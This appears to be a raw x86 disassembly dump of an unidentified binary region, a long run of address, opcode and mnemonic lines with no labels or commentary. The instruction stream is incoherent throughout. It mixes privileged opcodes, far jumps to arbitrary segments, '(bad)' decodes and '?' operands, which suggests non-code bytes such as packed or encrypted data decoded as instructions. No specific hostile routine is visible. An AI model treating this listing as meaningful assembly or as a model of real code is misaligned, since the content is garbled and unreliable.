  420bb7:	cmp    cl,BYTE PTR [edi-0x6c335ea3]
  420bbd:	and    esp,edx
  420bbf:	dec    ebp
  420bc0:	cmp    DWORD PTR [ebx],edi
  420bc2:	sub    al,BYTE PTR [esi]
  420bc4:	scas   eax,DWORD PTR es:[edi]
  420bc5:	adc    al,0x71
  420bc7:	shl    DWORD PTR [edx-0x7b],0x22
  420bcb:	icebp  
  420bcc:	adc    eax,0x8763f5c
  420bd1:	test   BYTE PTR [ecx],bl
  420bd3:	push   es
  420bd4:	call   0x151b:0xa8817b97
  420bdb:	sti    
  420bdc:	data16 cmp al,0xf1
  420bdf:	xor    eax,0x3afd747c
  420be4:	and    ebx,0xffffff91
  420be7:	jnp    0x420b79
  420be9:	ss mov ebp,0x89dec5f2
  420bef:	popf   
  420bf0:	mov    ebx,0x10db48f
  420bf5:	pop    esp
  420bf6:	les    eax,FWORD PTR [eax+eiz*4+0x9a9bb50]
  420bfd:	lods   eax,DWORD PTR ds:[esi]
  420bfe:	lods   al,BYTE PTR ds:[esi]
  420bff:	sar    DWORD PTR [edx+0x7a682b19],1
  420c05:	jae    0x420bef
  420c07:	or     al,0x55
  420c09:	or     edx,esi
  420c0b:	mov    ch,0xa0
  420c0d:	addr16 xor al,0xac
  420c10:	sti    
  420c11:	sahf   
  420c12:	xchg   BYTE PTR [edi],bh
  420c14:	scas   eax,DWORD PTR es:[edi]
  420c15:	ins    BYTE PTR es:[edi],dx
  420c16:	sub    eax,0x2af187cf
  420c1b:	into   
  420c1c:	cmp    eax,0xe4d39db3
  420c21:	add    al,0x31
  420c23:	adc    DWORD PTR [ebx+0x60],esi
  420c26:	fsubr  DWORD PTR [edx]
  420c28:	push   ebx
  420c29:	xchg   edi,eax
  420c2a:	in     eax,dx
  420c2b:	fisttp WORD PTR [esi-0x7e94230c]
  420c31:	clc    
  420c32:	push   0x2c
  420c34:	or     ah,BYTE PTR [ebx-0x1f10482d]
  420c3a:	arpl   bp,di
  420c3c:	pop    edx
  420c3d:	pop    esp
  420c3e:	outs   dx,BYTE PTR ds:[esi]
  420c3f:	mov    bh,0x72
  420c41:	pushf  
  420c42:	xchg   BYTE PTR [ecx],dh
  420c44:	repz js 0x420ca7
  420c47:	xchg   ebp,eax
  420c48:	mov    dh,0xdb
  420c4a:	jbe    0x420c08
  420c4c:	mov    edi,0xd4ba0074
  420c51:	jle    0x420c70
  420c53:	mov    esp,0xb40e6e2b
  420c58:	es xchg edi,eax
  420c5a:	in     al,dx
  420c5b:	mov    ds:0xea113455,eax
  420c60:	and    al,0xac
  420c62:	daa    
  420c63:	mov    ecx,0xfdba2071
  420c68:	ja     0x420bf6
  420c6a:	pop    edx
  420c6b:	popf   
  420c6c:	adc    DWORD PTR [ebp+0x4d],eax
  420c6f:	imul   bl
  420c71:	int    0xcb
  420c73:	pop    ds
  420c74:	je     0x420c98
  420c76:	call   0x601ff65e
  420c7b:	or     al,BYTE PTR [edi-0x44]
  420c7e:	pop    es
  420c7f:	mov    ds:0x9cb30b89,eax
  420c84:	push   ecx
  420c85:	add    ch,BYTE PTR [ebx]
  420c87:	jmp    0xd6f9d91e
  420c8c:	fs repnz push eax
  420c8f:	push   ebx
  420c90:	getsec 
  420c92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c93:	sub    al,BYTE PTR [ecx+0x6da7ed]
	...
  420d11:	add    BYTE PTR [eax],al
  420d13:	add    bl,ah
  420d15:	push   es
  420d16:	add    DWORD PTR [edi-0x1b],esi
  420d19:	ja     0x420d12
  420d1b:	xchg   esi,eax
  420d1c:	popf   
  420d1d:	mov    edx,0xd5f5c648
  420d22:	jnp    0x420d97
  420d24:	push   ecx
  420d25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d26:	add    DWORD PTR [eax],eax
  420d28:	ins    BYTE PTR es:[edi],dx
  420d29:	pop    es
  420d2a:	add    BYTE PTR [eax],al
  420d2c:	add    bl,BYTE PTR [ecx+edx*8]
  420d2f:	das    
  420d30:	fst    QWORD PTR [ebx-0x5f12ad5d]
  420d36:	stos   BYTE PTR es:[edi],al
  420d37:	aas    
  420d38:	outs   dx,BYTE PTR ds:[esi]
  420d39:	rcl    BYTE PTR [eax+0x504d5083],0xbe
  420d40:	push   edx
  420d41:	xlat   BYTE PTR ds:[ebx]
  420d42:	sub    ch,BYTE PTR ds:0x3fa13944
  420d48:	mov    ah,0xa
  420d4a:	std    
  420d4b:	jl     0x420d3a
  420d4d:	in     al,dx
  420d4e:	bound  esi,QWORD PTR [eax+0x355d82b6]
  420d54:	retf   0x768e
  420d57:	pop    esp
  420d58:	and    edi,esp
  420d5a:	outs   dx,DWORD PTR ds:[esi]
  420d5b:	out    dx,al
  420d5c:	test   eax,0x8f77c441
  420d61:	je     0x420d39
  420d63:	stc    
  420d64:	fwait
  420d65:	mov    bl,0x34
  420d67:	mov    WORD PTR [ecx-0x1d],gs
  420d6a:	xchg   ebp,eax
  420d6b:	or     edx,ebx
  420d6d:	dec    eax
  420d6e:	inc    edi
  420d6f:	stc    
  420d70:	out    0x61,al
  420d72:	mov    bh,0x67
  420d74:	jnp    0x420dcf
  420d76:	jecxz  0x420d49
  420d78:	push   edx
  420d79:	mov    ds:0x6a791516,eax
  420d7e:	clc    
  420d7f:	out    dx,eax
  420d80:	in     eax,0x9a
  420d82:	xchg   esi,eax
  420d83:	fisub  DWORD PTR ds:[ecx-0x512dc77b]
  420d8a:	ret    
  420d8b:	or     al,ah
  420d8d:	pop    es
  420d8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d8f:	mov    eax,ds:0xddbc2e30
  420d94:	mov    ds:0xf7f53468,eax
  420d99:	popf   
  420d9a:	xor    DWORD PTR [edi-0x19],0x64c5969b
  420da1:	dec    DWORD PTR [eax]
  420da3:	jge    0x420dfe
  420da5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420da6:	cmp    al,0xe0
  420da8:	cmp    eax,0x518667f8
  420dad:	mov    eax,ds:0xcc2db53e
  420db2:	int3   
  420db3:	fmul   QWORD PTR ds:0x2955b193
  420db9:	xor    eax,0xf633cf1c
  420dbe:	pop    ds
  420dbf:	cmp    eax,0xc50276fb
  420dc4:	xchg   ecx,eax
  420dc5:	jnp    0x420dc3
  420dc7:	pushf  
  420dc8:	aam    0x13
  420dca:	scas   eax,DWORD PTR es:[edi]
  420dcb:	rcl    ebx,1
  420dcd:	xor    edi,DWORD PTR [eax+ecx*8-0x1489a394]
  420dd4:	push   esi
  420dd5:	xchg   ecx,eax
  420dd6:	call   0x37b5:0x17a7279f
  420ddd:	jbe    0x420dfc
  420ddf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420de0:	mov    cl,0x29
  420de2:	push   ebp
  420de3:	add    BYTE PTR [eax+0x5d],bl
  420de6:	add    al,0xeb
  420de8:	imul   edx,DWORD PTR ds:0xced4c2f5,0xffffffe2
  420def:	ret    
  420df0:	mov    BYTE PTR [edx-0x799e313],bh
  420df6:	clc    
  420df7:	pop    esp
  420df8:	addr16 dec ebp
  420dfa:	add    edi,DWORD PTR [esi+edi*1]
  420dfd:	in     al,0x7a
  420dff:	add    ebp,esp
  420e01:	xchg   edi,eax
  420e02:	(bad)  
  420e03:	dec    ebx
  420e04:	gs mov eax,0xd0961928
  420e0a:	pop    ds
  420e0b:	cmp    bh,dl
  420e0d:	addr16 sub edi,edx
  420e10:	ror    DWORD PTR [edx-0x44],0x82
  420e14:	test   BYTE PTR [ecx-0x26],ch
  420e17:	push   ebx
  420e18:	mov    eax,edx
  420e1a:	sub    bl,dh
  420e1c:	push   0x33
  420e1e:	retf   
  420e1f:	call   0xbf8:0x2710d72
  420e26:	aam    0x98
  420e28:	push   es
  420e29:	mov    ch,0x23
  420e2b:	gs aad 0x2f
  420e2e:	lods   al,BYTE PTR ds:[esi]
  420e2f:	mov    esp,0xf5818d55
  420e34:	fiadd  DWORD PTR [esi]
  420e36:	fwait
  420e37:	rcr    BYTE PTR [edx-0x4ed595fe],0xb3
  420e3e:	or     ah,BYTE PTR [ebx+0x1e3922b]
  420e44:	out    dx,eax
  420e45:	sti    
  420e46:	stos   BYTE PTR es:[edi],al
  420e47:	adc    eax,ecx
  420e49:	fs mov fs,ebx
  420e4c:	sub    DWORD PTR [edx],eax
  420e4e:	dec    eax
  420e4f:	inc    ecx
  420e50:	pop    ebx
  420e51:	jnp    0x420e71
  420e53:	sar    DWORD PTR [eax+esi*4],cl
  420e56:	pop    ecx
  420e57:	ds jg  0x420e2c
  420e5a:	add    dh,BYTE PTR [edx-0x47]
  420e5d:	mov    cl,BYTE PTR [ebp+0xf]
  420e60:	int    0x8b
  420e62:	ror    DWORD PTR [eax+eiz*8-0x38],cl
  420e66:	jg     0x420e00
  420e68:	or     BYTE PTR [ebp+ebx*1-0x9],bl
  420e6c:	les    edi,FWORD PTR [edi]
  420e6e:	dec    eax
  420e6f:	bound  esp,QWORD PTR [edi+0x1]
  420e72:	leave  
  420e73:	cmp    dh,ah
  420e75:	cmp    dl,al
  420e77:	sar    DWORD PTR [edx-0x1d],1
  420e7a:	inc    esi
  420e7b:	jo     0x420e4e
  420e7d:	lods   al,BYTE PTR ds:[esi]
  420e7e:	sbb    al,0xfd
  420e80:	mov    ah,0x8a
  420e82:	(bad)  [ecx-0x39]
  420e85:	aad    0x3
  420e87:	mov    al,ds:0xc9aaf062
  420e8c:	fldcw  WORD PTR [esi+0xb]
  420e8f:	mov    ah,0x2f
  420e91:	fadd   DWORD PTR [edi+0x2d]
  420e94:	cmc    
  420e95:	ficom  WORD PTR [esi-0x3f241151]
  420e9b:	dec    esp
  420e9c:	sub    eax,0xd23fcef0
  420ea1:	jmp    0x420e35
  420ea3:	mov    BYTE PTR [edi-0x41885518],cl
  420ea9:	clc    
  420eaa:	jae    0x420e9c
  420eac:	push   ss
  420ead:	xchg   esp,eax
  420eae:	adc    esi,0xbc92d15a
  420eb4:	jne    0x420ed1
  420eb6:	mov    ds:0x8c9da56b,al
  420ebb:	adc    bh,cl
  420ebd:	push   ecx
  420ebe:	push   0x980efa15
  420ec3:	and    al,0xe4
  420ec5:	and    al,0xe8
  420ec7:	xchg   edx,eax
  420ec8:	fild   DWORD PTR ds:0x8b475bec
  420ece:	or     bl,0xd0
  420ed1:	imul   eax,DWORD PTR [ebx],0x4a
  420ed4:	mov    eax,ds:0x671824d9
  420ed9:	push   es
  420eda:	das    
  420edb:	xor    dh,al
  420edd:	aaa    
  420ede:	ja     0x420f31
  420ee0:	adc    eax,0x703ff2f2
  420ee5:	sbb    al,0x68
  420ee7:	sbb    al,0x9d
  420ee9:	inc    esi
  420eea:	push   ds
  420eeb:	and    bh,ah
  420eed:	test   al,0xd8
  420eef:	out    0xa2,eax
  420ef1:	pop    ebx
  420ef2:	clc    
  420ef3:	add    eax,0x6d6685eb
  420ef8:	out    0x8a,eax
  420efa:	cmp    eax,0xeddcee0a
  420eff:	das    
  420f00:	stos   BYTE PTR es:[edi],al
  420f01:	aas    
  420f02:	add    al,0x28
  420f04:	call   0x681bf32b
  420f09:	stos   DWORD PTR es:[edi],eax
  420f0a:	fsqrt  
  420f0c:	xor    esp,ebx
  420f0e:	dec    ebx
  420f0f:	cmp    BYTE PTR [ebx*4-0x6a984fcd],dl
  420f16:	fadd   DWORD PTR [eax-0xb]
  420f19:	enter  0xcacd,0xc8
  420f1d:	sub    al,0x35
  420f1f:	sbb    eax,0x8a26895a
  420f24:	inc    esp
  420f25:	add    eax,0xb5c09c73
  420f2a:	hlt    
  420f2b:	(bad)  
  420f2c:	adc    al,0xe5
  420f2e:	pusha  
  420f2f:	mov    ecx,0xd66924b4
  420f34:	les    esp,FWORD PTR [eax+0x59]
  420f37:	test   DWORD PTR [ebp+0x34],edx
  420f3a:	sti    
  420f3b:	test   BYTE PTR [eax-0x56bec914],0x60
  420f42:	and    al,0x88
  420f44:	nop
  420f45:	retf   0x207b
  420f48:	add    al,0x4f
  420f4a:	(bad)  
  420f4b:	ds adc esi,esp
  420f4e:	sub    al,0x5
  420f50:	lahf   
  420f51:	jns    0x420faa
  420f53:	add    esp,DWORD PTR [edi]
  420f55:	add    ah,cl
  420f57:	inc    DWORD PTR [esp+edx*2-0x586dca17]
  420f5e:	jo     0x420f25
  420f60:	sbb    BYTE PTR [edx-0x41],0xf1
  420f64:	fist   DWORD PTR [eax+edi*8-0x7de1fa63]
  420f6b:	jp     0x420fe4
  420f6d:	xchg   ebx,eax
  420f6e:	push   eax
  420f6f:	jge    0x420fa4
  420f71:	and    ebp,DWORD PTR [ecx-0x39a35882]
  420f77:	push   edi
  420f78:	call   0xd5183443
  420f7d:	dec    ecx
  420f7e:	pop    esi
  420f7f:	in     al,0xfb
  420f81:	fld    TBYTE PTR [edx-0x37217ec1]
  420f87:	fisub  DWORD PTR [ecx-0x7e33d043]
  420f8d:	outs   dx,BYTE PTR ds:[esi]
  420f8e:	mov    bl,0x3f
  420f90:	pop    edi
  420f91:	xchg   esp,eax
  420f92:	repnz fld QWORD PTR [ebx+0x1d5c3969]
  420f99:	loope  0x420f34
  420f9b:	cmp    ebp,DWORD PTR [ebp+eiz*2-0x2e]
  420f9f:	pop    esi
  420fa0:	sub    BYTE PTR [eax-0x491125f],bl
  420fa6:	sub    eax,0xb7a25f26
  420fab:	cdq    
  420fac:	xlat   BYTE PTR ds:[ebx]
  420fad:	test   BYTE PTR [edx],dh
  420faf:	fisubr DWORD PTR [edi]
  420fb1:	mov    eax,ds:0xaa6dc904
  420fb6:	xchg   DWORD PTR [edx+ebp*1],ecx
  420fb9:	push   ebx
  420fba:	sub    ah,0xbd
  420fbd:	fwait
  420fbe:	stc    
  420fbf:	fcmovu st,st(7)
  420fc1:	jno    0x420fed
  420fc3:	sti    
  420fc4:	and    eax,0x5dccfd9
  420fc9:	mov    eax,DWORD PTR ds:0x593e7b9c
  420fcf:	mov    edx,0xad20a8bb
  420fd4:	shl    DWORD PTR [ebp+eiz*2+0x43],cl
  420fd8:	jbe    0x421026
  420fda:	int    0xb1
  420fdc:	hlt    
  420fdd:	xchg   esi,eax
  420fde:	ins    BYTE PTR es:[edi],dx
  420fdf:	lock retf 
  420fe1:	jmp    0xfba147a
  420fe6:	and    dh,BYTE PTR [bx+0x3762]
  420feb:	jle    0x420f8f
  420fed:	dec    esp
  420fee:	inc    edi
  420fef:	adc    DWORD PTR [edx],esi
  420ff1:	imul   ecx,DWORD PTR ds:0x4c11bdd4,0x7ac07c81
  420ffb:	or     dh,BYTE PTR [eax+0x20]
  420ffe:	fldenv [edx-0x45923d93]
  421004:	mov    ?,WORD PTR [eax-0x26]
  421007:	loope  0x420ff3
  421009:	push   es
  42100a:	inc    esp
  42100b:	paddq  mm6,QWORD PTR [ecx+0x4c0f6207]
  421012:	push   eax
  421013:	inc    ebx
  421014:	popf   
  421015:	xor    al,0x7
  421017:	mov    dl,0x52
  421019:	mov    ch,BYTE PTR [ecx+0xd0aa034]
  42101f:	mov    ah,0x65
  421021:	sbb    esi,ebp
  421023:	xchg   ecx,eax
  421024:	pop    sp
  421026:	xchg   ch,dl
  421028:	inc    ebx
  421029:	push   es
  42102a:	jb     0x42102e
  42102c:	shl    BYTE PTR [ebx+0x5fb132e0],cl
  421032:	imul   esp,DWORD PTR [ebx-0x1ab61f7a],0xd806c7d4
  42103c:	push   eax
  42103d:	js     0x421040
  42103f:	add    dh,dh
  421041:	not    bl
  421043:	add    al,0xd
  421045:	gs fsubr st,st(5)
  421048:	lods   al,BYTE PTR ds:[esi]
  421049:	in     al,0xa7
  42104b:	ins    DWORD PTR es:[edi],dx
  42104c:	pop    esp
  42104d:	daa    
  42104e:	ret    
  42104f:	xchg   edi,eax
  421050:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421051:	(bad)  [esi-0x3a47c7d7]
  421057:	push   edx
  421058:	cmc    
  421059:	fwait
  42105a:	retf   
  42105b:	sbb    eax,0x118d1be7
  421060:	(bad)
  421063:	scas   eax,DWORD PTR es:[edi]
  421064:	inc    eax
  421065:	mov    dh,0x60
  421067:	sbb    esi,DWORD PTR [edi]
  421069:	int    0xa2
  42106b:	inc    ecx
  42106c:	js     0x4210b1
  42106e:	jnp    0x421098
  421070:	or     BYTE PTR [edi+0x8a4c20],cl
  421076:	or     BYTE PTR [esp+ebx*4],bh
  421079:	mov    DWORD PTR [edx],ebp
  42107b:	shl    DWORD PTR [eax-0x44d50f75],0xad
  421082:	cli    
  421083:	sbb    DWORD PTR [eax+0x7b82c03e],esp
  421089:	mov    ?,WORD PTR [ebx+0x71]
  42108c:	push   edi
  42108d:	imul   esp,DWORD PTR [ecx],0xfffffffb
  421090:	inc    ebp
  421091:	add    ecx,eax
  421093:	test   al,0xb0
  421095:	aam    0xe
  421097:	lock inc esp
  42109a:	js     0x42102e
  42109c:	mov    WORD PTR [edx-0x77eff685],fs
  4210a2:	mov    dh,0xe9
  4210a4:	sub    eax,0xd9a358ef
  4210a9:	sar    edi,cl
  4210ab:	pop    ecx
  4210ac:	in     eax,dx
  4210ad:	inc    ebp
  4210ae:	jno    0x4210ab
  4210b0:	sahf   
  4210b1:	lock mov edi,0x8676940f
  4210b7:	sub    ch,BYTE PTR [edi+ecx*8-0x4d]
  4210bb:	gs pusha 
  4210bd:	push   ebp
  4210be:	test   DWORD PTR [ebp-0x24],ecx
  4210c1:	shl    BYTE PTR ds:0xd38cd583,1
  4210c7:	xchg   bx,ax
  4210c9:	les    edi,FWORD PTR [ebx+0x66f59d71]
  4210cf:	scas   al,BYTE PTR es:[edi]
  4210d0:	push   ebx
  4210d1:	fadd   DWORD PTR [edi+esi*1]
  4210d4:	cmp    ebx,DWORD PTR [esi]
  4210d6:	gs pop es
  4210d8:	mov    al,0xbe
  4210da:	cld    
  4210db:	nop
  4210dc:	(bad)  
  4210dd:	pop    ss
  4210de:	dec    edi
  4210df:	xor    al,0xe4
  4210e1:	or     BYTE PTR [esi-0x20],bl
  4210e4:	ss ins BYTE PTR es:[edi],dx
  4210e6:	sbb    al,BYTE PTR [esi+0x61]
  4210e9:	in     al,dx
  4210ea:	mov    edx,eax
  4210ec:	dec    edx
  4210ed:	jb     0x42107d
  4210ef:	add    DWORD PTR [ebx+0x5f387adb],ebx
  4210f5:	sub    DWORD PTR [eax],esi
  4210f7:	retf   0x7bbd
  4210fa:	sub    dl,BYTE PTR [ebx]
  4210fc:	pop    edx
  4210fd:	scas   al,BYTE PTR es:[edi]
  4210fe:	sti    
  4210ff:	into   
  421100:	jp     0x4210d8
  421102:	inc    ecx
  421103:	bnd jmp 0x4210a8
  421106:	sub    al,0x96
  421108:	(bad)  
  421109:	pop    ds
  42110a:	int    0x40
  42110c:	fwait
  42110d:	push   ecx
  42110e:	push   ss
  42110f:	cdq    
  421110:	(bad)  
  421111:	std    
  421112:	dec    eax
  421113:	ret    0x5ab3
  421116:	leave  
  421117:	cmp    BYTE PTR [edx],ah
  421119:	int3   
  42111a:	jnp    0x4210d3
  42111c:	xor    DWORD PTR fs:[ebp+0x39059251],0x49
  421124:	(bad)  
  421126:	call   0xad45:0x893d9c8b
  42112d:	enter  0x1510,0x78
  421131:	mov    dl,0x4f
  421133:	fwait
  421134:	leave  
  421135:	int3   
  421136:	jnp    0x421103
  421138:	sahf   
  421139:	add    DWORD PTR [ebx+0x75],0xd82d93e0
  421140:	aam    0x2f
  421142:	loopne 0x4211b5
  421144:	fs pushf 
  421146:	loope  0x421182
  421148:	inc    ecx
  421149:	push   0x6b
  42114b:	repnz inc esi
  42114d:	cli    
  42114e:	pop    esp
  42114f:	stos   DWORD PTR es:[edi],eax
  421150:	in     eax,0xeb
  421152:	outs   dx,BYTE PTR ds:[esi]
  421153:	(bad)  
  421154:	std    
  421155:	jb     0x42116f
  421157:	mov    ds:0x260e458e,eax
  42115c:	dec    eax
  42115d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42115e:	adc    ch,al
  421160:	jb     0x4210e5
  421162:	and    BYTE PTR [edi],cl
  421164:	rol    BYTE PTR [eax+0x11],0xec
  421168:	test   al,0xe8
  42116a:	inc    edi
  42116b:	adc    BYTE PTR [edi],dh
  42116d:	int    0x51
  42116f:	push   es
  421170:	inc    edx
  421171:	mov    WORD PTR [eax],?
  421173:	aad    0x1c
  421175:	rcl    BYTE PTR [ebx-0x454d7950],1
  42117b:	sbb    BYTE PTR [esi+0x54805fb4],al
  421181:	sbb    BYTE PTR [edi+0x414a0c95],bh
  421187:	div    DWORD PTR [edi+0x5d]
  42118a:	and    al,0xaa
  42118c:	inc    edx
  42118d:	mov    edx,0xf285de82
  421192:	dec    ebp
  421193:	mov    ds:0xd3843349,eax
  421198:	mov    dh,0xea
  42119a:	mov    ah,0x60
  42119c:	mov    WORD PTR [esi+0x50cba94b],?
  4211a2:	mov    esi,0x54b86608
  4211a7:	fidivr WORD PTR [eax+0x4a731564]
  4211ad:	(bad)  
  4211ae:	bound  esi,QWORD PTR [ebx+0x246a2e0c]
  4211b4:	xchg   edi,eax
  4211b5:	adc    eax,0xac6ed7ab
  4211ba:	test   BYTE PTR [eax],dl
  4211bc:	fwait
  4211bd:	ret    0x6073
  4211c0:	xlat   BYTE PTR ds:[ebx]
  4211c1:	lods   al,BYTE PTR ds:[esi]
  4211c2:	sbb    dh,BYTE PTR [eax-0x52]
  4211c5:	xchg   ebx,eax
  4211c6:	inc    edx
  4211c7:	ror    DWORD PTR [edx],1
  4211c9:	loopne 0x4211a3
  4211cb:	loop   0x4211ae
  4211cd:	jno    0x42122c
  4211cf:	(bad)  
  4211d1:	fs dec ebp
  4211d3:	mov    ?,WORD PTR [ecx+0x0]
  4211d6:	dec    esp
  4211d7:	stc    
  4211d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4211d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4211da:	mov    BYTE PTR [ebp-0x3a],ch
  4211dd:	popa   
  4211de:	stos   DWORD PTR es:[edi],eax
  4211df:	inc    ecx
  4211e0:	and    al,0xa6
  4211e2:	pop    ds
  4211e3:	lods   al,BYTE PTR ds:[esi]
  4211e4:	or     dl,BYTE PTR [edx-0x7944f359]
  4211ea:	cmc    
  4211eb:	mov    edi,0x402621b5
  4211f0:	mov    ch,0x3e
  4211f2:	push   0xffffffb6
  4211f4:	xor    al,0x2e
  4211f6:	inc    edx
  4211f7:	mov    ds:0x51a3616e,al
  4211fc:	jb     0x421247
  4211fe:	ret    
  4211ff:	inc    ecx
  421200:	push   ebx
  421201:	jne    0x42118e
  421203:	lahf   
  421204:	jns    0x421282
  421206:	pop    edi
  421207:	mov    BYTE PTR [ecx+0x57],0xe7
  42120b:	cwde   
  42120c:	push   0xeb99edcf
  421211:	push   ecx
  421212:	xchg   ecx,eax
  421213:	xor    bh,BYTE PTR [ebp+ecx*4-0x11fda8c3]
  42121a:	loope  0x42126a
  42121c:	cmp    esi,DWORD PTR [edx+edx*8+0x3c5950ba]
  421223:	xor    eax,0xab0b0ded
  421228:	xor    DWORD PTR [ecx+0x7a],ebx
  42122b:	xlat   BYTE PTR ds:[ebx]
  42122c:	int3   
  42122d:	hlt    
  42122e:	cmc    
  42122f:	shr    ebp,cl
  421231:	rcr    dl,cl
  421233:	add    DWORD PTR [ebx],esp
  421235:	adc    eax,0x38c2bbe1
  42123a:	and    esi,DWORD PTR [edx]
  42123c:	repnz repz sar BYTE PTR [esp+ebx*8-0x58],0x60
  421243:	inc    ebp
  421244:	mov    edx,0xea89b26f
  421249:	sbb    DWORD PTR [ecx+ebp*4+0x61],0xffffffa9
  42124e:	imul   DWORD PTR [ecx+0x32]
  421251:	or     al,0x73
  421253:	push   edx
  421254:	mov    DWORD PTR [esi-0x4f],0xe8e156a
  42125b:	xchg   ecx,eax
  42125c:	ds jg  0x42128d
  42125f:	ss dec eax
  421261:	jbe    0x421212
  421263:	adc    eax,0x865a0bb5
  421268:	mov    ebp,0x55a09cb7
  42126d:	dec    ebx
  42126e:	cdq    
  42126f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421270:	repnz xor eax,0x9b29d459
  421276:	inc    ebp
  421277:	mov    ds:0xe4d26f35,eax
  42127c:	lods   eax,DWORD PTR ds:[esi]
  42127d:	loopne 0x4212f0
  42127f:	out    0xe4,eax
  421281:	(bad)  
  421282:	or     BYTE PTR [ecx],al
  421284:	add    DWORD PTR [ebx+0x495ecc8f],esi
  42128a:	mov    ds:0xa39ac045,al
  42128f:	adc    BYTE PTR [edx],al
  421291:	in     al,0x89
  421293:	xchg   edx,eax
  421294:	addr16 mov al,0x5
  421297:	or     BYTE PTR [ecx+ecx*2-0x60],0x87
  42129c:	jb     0x42124f
  42129e:	push   0xffffffcf
  4212a0:	adc    DWORD PTR [ebx+0x1ebccb30],0x2e0a47fb
  4212aa:	inc    edi
  4212ab:	ja     0x4212b8
  4212ad:	bound  eax,QWORD PTR [ebp-0x66cb85e7]
  4212b3:	fld    DWORD PTR [esi+edx*1-0xe]
  4212b7:	hlt    
  4212b8:	inc    ebx
  4212b9:	adc    eax,0x25d5768a
  4212be:	pop    edx
  4212bf:	les    edi,FWORD PTR [ebp-0x7b]
  4212c2:	dec    esi
  4212c3:	push   0xfffffffb
  4212c5:	push   ds
  4212c6:	jns    0x42124e
  4212c8:	call   0xe928:0x6c0b2354
  4212cf:	aas    
  4212d0:	addr16 stc 
  4212d2:	es fs adc al,0xd7
  4212d6:	pushf  
  4212d7:	arpl   WORD PTR [esi+0x5c10cb60],si
  4212dd:	stos   BYTE PTR es:[edi],al
  4212de:	mov    eax,ds:0x73c1d0
  4212e3:	mov    dh,0xdc
  4212e5:	xor    ecx,DWORD PTR [edi-0x1d7843f]
  4212eb:	pop    esp
  4212ec:	mov    cl,0x6a
  4212ee:	mov    ds:0x3c9af578,eax
  4212f3:	push   ds
  4212f4:	cld    
  4212f5:	in     eax,dx
  4212f6:	daa    
  4212f7:	or     cl,ah
  4212f9:	add    DWORD PTR [ebx-0x1b],0xf1df9b23
  421300:	adc    esi,DWORD PTR [edi+0x27fe3c0f]
  421306:	mov    ebp,0x4892bb73
  42130b:	dec    ecx
  42130c:	adc    al,0x1a
  42130e:	jns    0x42135e
  421310:	jns    0x421348
  421312:	ret    0xdfa2
  421315:	stos   BYTE PTR es:[edi],al
  421316:	dec    edi
  421317:	jnp    0x42129e
  421319:	pop    edi
  42131a:	xor    esp,DWORD PTR [edx]
  42131c:	mov    ds,edx
  42131e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42131f:	jl     0x421310
  421321:	jb     0x4212b5
  421323:	mov    WORD PTR ds:0x44845d70,fs
  421329:	jl     0x42130d
  42132b:	daa    
  42132c:	adc    cl,BYTE PTR [ebp-0x31e9ef13]
  421332:	jg     0x421305
  421334:	push   ss
  421335:	mov    ds,WORD PTR [eax-0x6a]
  421338:	and    al,0x4d
  42133a:	jmp    0xcb77:0xe499b384
  421341:	bound  edi,QWORD PTR [ecx-0x37e3a805]
  421347:	cwde   
  421348:	adc    dh,BYTE PTR [ecx-0x150e9]
  42134e:	mov    edx,0x7b7e6ace
  421353:	sub    BYTE PTR [ecx-0x51],0x88
  421357:	pop    eax
  421358:	ds gs cmp eax,0x5d67e731
  42135f:	and    eax,0x825b105e
  421364:	div    BYTE PTR [esi]
  421366:	aaa    
  421367:	fsub   DWORD PTR [ebp-0x5b5061a1]
  42136d:	clc    
  42136e:	jnp    0x4212f8
  421370:	dec    DWORD PTR [eax-0x34]
  421373:	xlat   BYTE PTR ds:[ebx]
  421374:	jecxz  0x421324
  421376:	jp     0x421329
  421378:	adc    al,0x88
  42137a:	(bad)  
  42137b:	lods   eax,DWORD PTR ds:[esi]
  42137c:	mov    bh,BYTE PTR [esi+0x52]
  42137f:	and    al,0xd4
  421381:	or     ch,BYTE PTR [eax+0x3c269ac2]
  421387:	add    al,0xbc
  421389:	pushf  
  42138a:	(bad)
  42138e:	pop    esp
  42138f:	fcomip st,st(3)
  421391:	out    0x60,eax
  421393:	scas   al,BYTE PTR es:[edi]
  421394:	push   ss
  421395:	(bad)  
  421396:	rcl    BYTE PTR [ebx-0x30],cl
  421399:	lods   al,BYTE PTR ds:[esi]
  42139a:	ss push es
  42139c:	add    esp,DWORD PTR [ecx+0x6b12e533]
  4213a2:	hlt    
  4213a3:	xor    dh,dh
  4213a5:	icebp  
  4213a6:	or     BYTE PTR [eax+0x70],0xb1
  4213aa:	pop    ebp
  4213ab:	setg   BYTE PTR [edi+0x4d]
  4213af:	or     esp,DWORD PTR [ebx-0x4]
  4213b2:	pop    ecx
  4213b3:	(bad)  
  4213b4:	call   0xe0c2354a
  4213b9:	jecxz  0x42141c
  4213bb:	xor    ah,BYTE PTR [ecx]
  4213bd:	jle    0x421406
  4213bf:	je     0x42138d
  4213c1:	push   cs
  4213c2:	fistp  QWORD PTR [esi+edx*1]
  4213c5:	adc    eax,0x80ddf6ad
  4213ca:	mov    ecx,?
  4213cc:	mov    bh,0x1a
  4213ce:	adc    DWORD PTR [ebx],edx
  4213d0:	leave  
  4213d1:	mov    edi,0xeb938abf
  4213d6:	adc    edx,DWORD PTR [esi+0x15659eb0]
  4213dc:	cmp    bh,BYTE PTR [eax]
  4213de:	cmp    DWORD PTR [ebp+0x44ec6562],esi
  4213e4:	pop    ebx
  4213e5:	adc    eax,0x4c578c7
  4213ea:	shl    bl,cl
  4213ec:	loop   0x42140b
  4213ee:	fsincos 
  4213f0:	pop    ds
  4213f1:	add    al,ch
  4213f3:	and    ecx,ebx
  4213f5:	jle    0x421430
  4213f7:	sbb    esp,DWORD PTR [esi]
  4213f9:	int    0x69
  4213fb:	sub    cl,BYTE PTR [ecx+0x65]
  4213fe:	fwait
